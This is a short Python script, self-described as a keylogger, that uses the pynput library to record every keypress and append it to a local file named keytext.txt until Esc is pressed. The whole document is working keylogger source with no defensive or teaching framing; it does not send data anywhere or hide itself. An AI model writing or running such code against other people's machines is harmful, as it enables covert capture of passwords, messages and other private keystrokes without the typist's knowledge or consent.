# Download pynput (pip install pynput)
from pynput import keyboard

def keyPressed(key):
    # Halts the keylogger
    if key == keyboard.Key.esc:
        return False
         
    keys = []
    keys.append(key)
    # Create a keytext.txt if it does not exist yet
    with open("keytext.txt", "a") as logKey:
        for key in keys:
            logKey.write(str(key))
    #print("{0} pressed".format(key))

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()